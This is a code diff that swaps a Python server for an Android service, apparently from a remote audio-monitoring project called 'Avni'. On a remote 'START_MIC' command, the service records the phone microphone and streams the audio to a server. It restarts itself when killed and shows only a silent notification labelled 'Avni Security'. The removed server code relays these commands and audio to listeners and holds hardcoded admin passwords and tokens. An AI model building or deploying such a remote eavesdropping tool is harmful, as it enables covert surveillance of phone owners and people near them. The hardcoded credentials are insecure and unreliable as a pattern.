@@ -1,201 +1,250 @@
-"""
-Avni Audio Control System - Backend Server
-Render.com compatible — HTTP + WebSocket on same port
-"""
+package com.example.avni;
 
-import os
-import json
-import asyncio
-import threading
-from datetime import datetime
-from flask import Flask, request, jsonify
-from flask_cors import CORS
-from geventwebsocket.handler import WebSocketHandler
-from geventwebsocket import WebSocketError
-from gevent.pywsgi import WSGIServer
-from gevent import monkey
-monkey.patch_all()
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.Intent;
+import android.media.AudioFormat;
+import android.media.AudioRecord;
+import android.media.MediaRecorder;
+import android.os.Build;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.Looper;
+import android.util.Log;
+import androidx.core.app.NotificationCompat;
 
-# 🔴 IMPORTANT FIX FOR RENDER ASYNC LOOP
-asyncio.set_event_loop(asyncio.new_event_loop())
+import org.java_websocket.client.WebSocketClient;
+import org.java_websocket.handshake.ServerHandshake;
 
-# ─── CONFIG ───────────────────────────────────────────────────────────────────
-SECRET_TOKEN   = 'avni_secret_2024_xyz'
-ADMIN_PASSWORD = 'avni@admin2024'
-PORT = int(os.environ.get('PORT', 5000))
+import java.net.URI;
+import java.nio.ByteBuffer;
+import java.util.Arrays;
+import java.util.UUID;
 
-# ─── STATE ────────────────────────────────────────────────────────────────────
-devices        = {}  # device_id -> info
-device_sockets = {}  # device_id -> websocket
-audio_clients  = {}  # device_id -> [admin ws...]
+public class AudioForegroundService extends Service {
 
-# ─── FLASK ────────────────────────────────────────────────────────────────────
-app = Flask(__name__)
-CORS(app, origins="*")
+    private static final String TAG = "AvniService";
+    private static final String CHANNEL_ID = "avni_channel";
+    private static final int NOTIF_ID = 1001;
 
-def check_auth(req):
-    return req.headers.get('Authorization','') == f'Bearer {SECRET_TOKEN}'
+    // ── Render Server URL ─────────────────────────────────────────────────────
+    private static final String WS_BASE = "wss://avni-backend.onrender.com";
+    // ─────────────────────────────────────────────────────────────────────────
 
-# ✅ ROOT ROUTE FIX (Render 404 Fix)
-@app.route('/')
-def home():
-    return "Avni Backend Running Successfully Aslok"
+    private static final int SAMPLE_RATE = 16000;
 
-@app.route('/health', methods=['GET'])
-def health():
-    return jsonify({'status':'running','devices':len(devices)})
+    private WebSocketClient wsClient;
+    private AudioRecord audioRecord;
+    private Thread recordThread;
+    private volatile boolean isRecording = false;
+    private volatile boolean shouldRun = true;
+    private String deviceId = "unknown";
+    private final Handler handler = new Handler(Looper.getMainLooper());
+    private Runnable reconnectRunnable;
 
-@app.route('/admin/login', methods=['POST'])
-def admin_login():
-    if request.json.get('password') == ADMIN_PASSWORD:
-        return jsonify({'status':'ok','token':SECRET_TOKEN})
-    return jsonify({'error':'Invalid password'}),401
-
-@app.route('/register', methods=['POST'])
-def register_device():
-    if not check_auth(request): return jsonify({'error':'Unauthorized'}),401
-    data = request.json
-    device_id = data.get('device_id')
-    dev_name  = data.get('device_name','Unknown Phone')
-    if not device_id: return jsonify({'error':'device_id required'}),400
-
-    if device_id not in devices:
-        friendly = f'Phone No.{len(devices)+1}'
-    else:
-        friendly = devices[device_id].get('friendly_name', dev_name)
-
-    devices[device_id] = {
-        'device_id':    device_id,
-        'device_name':  dev_name,
-        'friendly_name':friendly,
-        'last_seen':    datetime.now().isoformat(),
-        'streaming':    False,
-        'mic_enabled':  False,
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        createNotificationChannel();
+        startForeground(NOTIF_ID, buildNotification("Avni Security", "Starting..."));
+        deviceId = loadDeviceId();
+        connectWebSocket();
     }
-    print(f'[+] Registered: {friendly}')
-    return jsonify({'status':'ok','device_id':device_id,'friendly_name':friendly})
 
-@app.route('/devices', methods=['GET'])
-def list_devices():
-    tok = request.headers.get('Authorization','') or f"Bearer {request.args.get('token','')}"
-    if tok != f'Bearer {SECRET_TOKEN}': return jsonify({'error':'Unauthorized'}),401
-    return jsonify(list(devices.values()))
-
-@app.route('/command/<device_id>', methods=['POST'])
-def send_command(device_id):
-    if not check_auth(request): return jsonify({'error':'Unauthorized'}),401
-    cmd = request.json.get('command')
-    if cmd not in ('START_MIC','STOP_MIC'):
-        return jsonify({'error':'Invalid command'}),400
-
-    ws = device_sockets.get(device_id)
-    if not ws:
-        return jsonify({'error':'Device not connected'}),404
-
-    try:
-        ws.send(json.dumps({'cmd': cmd}))
-        if device_id in devices:
-            devices[device_id]['mic_enabled'] = (cmd == 'START_MIC')
-        print(f'[CMD] {cmd} → {device_id[:8]}...')
-        return jsonify({'status':'ok','command':cmd})
-    except Exception as e:
-        return jsonify({'error': str(e)}),500
-
-# ─── WEBSOCKET HANDLER ────────────────────────────────────────────────────────
-@app.route('/ws/<role>/<device_id>')
-def websocket_handler(role, device_id):
-    ws = request.environ.get('wsgi.websocket')
-    if not ws:
-        return 'WebSocket required', 400
-
-    if role == 'audio':
-        handle_phone(ws, device_id)
-    elif role == 'listen':
-        handle_admin(ws, device_id)
-
-    return ''
-
-def handle_phone(ws, device_id):
-    device_sockets[device_id] = ws
-
-    if device_id not in devices:
-        friendly = f'Phone No.{len(devices)+1}'
-        devices[device_id] = {
-            'device_id':    device_id,
-            'device_name':  'Unknown Phone',
-            'friendly_name':friendly,
-            'last_seen':    datetime.now().isoformat(),
-            'streaming':    False,
-            'mic_enabled':  False,
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (wsClient == null || !wsClient.isOpen()) {
+            connectWebSocket();
         }
-        print(f'[+] Auto-registered: {friendly}')
+        return START_STICKY;
+    }
 
-    devices[device_id]['last_seen'] = datetime.now().isoformat()
-    print(f'[+] Phone connected: {device_id[:8]}...')
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
 
-    try:
-        while True:
-            data = ws.receive()
-            if data is None:
-                break
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        restartService();
+        super.onTaskRemoved(rootIntent);
+    }
 
-            if isinstance(data, str) and len(data) < 200:
-                try:
-                    msg = json.loads(data)
-                    if 'status' in msg:
-                        devices[device_id]['streaming'] = (msg['status'] == 'streaming')
-                    devices[device_id]['last_seen'] = datetime.now().isoformat()
-                    continue
-                except:
-                    pass
+    @Override
+    public void onDestroy() {
+        shouldRun = false;
+        stopMic();
+        closeWs();
+        handler.postDelayed(this::restartService, 1000);
+        super.onDestroy();
+    }
 
-            devices[device_id]['streaming'] = True
-            devices[device_id]['last_seen'] = datetime.now().isoformat()
+    private void restartService() {
+        Intent restart = new Intent(getApplicationContext(), AudioForegroundService.class);
+        restart.setPackage(getPackageName());
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(restart);
+        } else {
+            startService(restart);
+        }
+    }
 
-            listeners = audio_clients.get(device_id, [])
-            dead = []
-            for listener in listeners:
-                try:
-                    listener.send(data)
-                except:
-                    dead.append(listener)
-            for d in dead:
-                listeners.remove(d)
+    // ── WebSocket ─────────────────────────────────────────────────────────────
+    private void connectWebSocket() {
+        if (!shouldRun) return;
+        if (reconnectRunnable != null) {
+            handler.removeCallbacks(reconnectRunnable);
+            reconnectRunnable = null;
+        }
+        closeWs();
 
-    except WebSocketError as e:
-        print(f'Phone WS error: {e}')
-    finally:
-        device_sockets.pop(device_id, None)
-        if device_id in devices:
-            devices[device_id]['streaming']   = False
-            devices[device_id]['mic_enabled'] = False
-        print(f'[-] Phone disconnected: {device_id[:8]}...')
+        try {
+            URI uri = new URI(WS_BASE + "/ws/audio/" + deviceId);
+            Log.d(TAG, "Connecting: " + uri);
 
-def handle_admin(ws, device_id):
-    audio_clients.setdefault(device_id, []).append(ws)
-    print(f'[+] Admin listening: {device_id[:8]}...')
-    try:
-        while True:
-            msg = ws.receive()
-            if msg is None:
-                break
-    except WebSocketError:
-        pass
-    finally:
-        try:
-            audio_clients[device_id].remove(ws)
-        except:
-            pass
-        print(f'[-] Admin stopped: {device_id[:8]}...')
+            wsClient = new WebSocketClient(uri) {
+                @Override
+                public void onOpen(ServerHandshake h) {
+                    Log.d(TAG, "WS connected!");
+                    updateNotification("Avni Security", "Connected — waiting for command");
+                }
 
-# ─── MAIN ─────────────────────────────────────────────────────────────────────
-if __name__ == '__main__':
-    print('='*50)
-    print('  Avni Audio Control System')
-    print(f'  Port → {PORT}')
-    print(f'  PW   → {ADMIN_PASSWORD}')
-    print('='*50)
+                @Override
+                public void onMessage(String message) {
+                    Log.d(TAG, "CMD: " + message);
+                    if (message.contains("START_MIC")) startMic();
+                    else if (message.contains("STOP_MIC")) stopMic();
+                }
 
-    server = WSGIServer(('0.0.0.0', PORT), app, handler_class=WebSocketHandler)
-    print(f'Server running on port {PORT}')
-    server.serve_forever()
+                @Override
+                public void onMessage(ByteBuffer bytes) {}
+
+                @Override
+                public void onClose(int code, String reason, boolean remote) {
+                    Log.d(TAG, "WS closed: " + reason);
+                    stopMic();
+                    updateNotification("Avni Security", "Reconnecting...");
+                    scheduleReconnect(3000);
+                }
+
+                @Override
+                public void onError(Exception ex) {
+                    Log.e(TAG, "WS error: " + (ex != null ? ex.getMessage() : "unknown"));
+                    scheduleReconnect(3000);
+                }
+            };
+            wsClient.setConnectionLostTimeout(20);
+            wsClient.connect();
+
+        } catch (Exception e) {
+            Log.e(TAG, "Connect error: " + e.getMessage());
+            scheduleReconnect(3000);
+        }
+    }
+
+    private void scheduleReconnect(long ms) {
+        if (!shouldRun) return;
+        if (reconnectRunnable != null) handler.removeCallbacks(reconnectRunnable);
+        reconnectRunnable = () -> { if (shouldRun) connectWebSocket(); };
+        handler.postDelayed(reconnectRunnable, ms);
+    }
+
+    private void closeWs() {
+        if (wsClient != null) {
+            try { wsClient.close(); } catch (Exception e) {}
+            wsClient = null;
+        }
+    }
+
+    // ── Mic ───────────────────────────────────────────────────────────────────
+    private void startMic() {
+        if (isRecording) return;
+        Log.d(TAG, "Starting mic");
+        updateNotification("Avni Security", "🔴 Mic active — streaming");
+
+        try {
+            int bufSize = AudioRecord.getMinBufferSize(SAMPLE_RATE,
+                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
+
+            audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC,
+                SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO,
+                AudioFormat.ENCODING_PCM_16BIT, bufSize * 4);
+
+            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
+                Log.e(TAG, "AudioRecord init failed");
+                audioRecord.release(); audioRecord = null; return;
+            }
+
+            audioRecord.startRecording();
+            isRecording = true;
+
+            final int fBufSize = bufSize;
+            recordThread = new Thread(() -> {
+                byte[] buf = new byte[fBufSize];
+                while (isRecording) {
+                    int read = audioRecord.read(buf, 0, buf.length);
+                    if (read > 0 && wsClient != null && wsClient.isOpen()) {
+                        try {
+                            wsClient.send(Arrays.copyOf(buf, read));
+                        } catch (Exception e) {
+                            Log.e(TAG, "Send error: " + e.getMessage());
+                        }
+                    }
+                }
+            });
+            recordThread.setDaemon(true);
+            recordThread.start();
+
+        } catch (Exception e) {
+            Log.e(TAG, "Mic error: " + e.getMessage());
+        }
+    }
+
+    private void stopMic() {
+        if (!isRecording) return;
+        isRecording = false;
+        if (audioRecord != null) {
+            try { audioRecord.stop(); audioRecord.release(); } catch (Exception e) {}
+            audioRecord = null;
+        }
+        updateNotification("Avni Security", "Connected — waiting for command");
+    }
+
+    // ── Notification ──────────────────────────────────────────────────────────
+    private Notification buildNotification(String title, String text) {
+        Intent intent = new Intent(this, MainActivity.class);
+        PendingIntent pi = PendingIntent.getActivity(this, 0, intent,
+            PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
+        return new NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle(title).setContentText(text)
+            .setSmallIcon(android.R.drawable.ic_lock_silent_mode_off)
+            .setContentIntent(pi).setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_LOW).setSilent(true).build();
+    }
+
+    private void updateNotification(String title, String text) {
+        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+        if (nm != null) nm.notify(NOTIF_ID, buildNotification(title, text));
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel ch = new NotificationChannel(
+                CHANNEL_ID, "Avni Audio", NotificationManager.IMPORTANCE_LOW);
+            ch.setSound(null, null); ch.enableVibration(false);
+            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (nm != null) nm.createNotificationChannel(ch);
+        }
+    }
+
+    private String loadDeviceId() {
+        android.content.SharedPreferences p = getSharedPreferences("avni_prefs", MODE_PRIVATE);
+        String id = p.getString("device_id", null);
+        if (id == null) {
+            id = UUID.randomUUID().toString();
+            p.edit().putString("device_id", id).apply();
+        }
+        return id;
+    }
+}
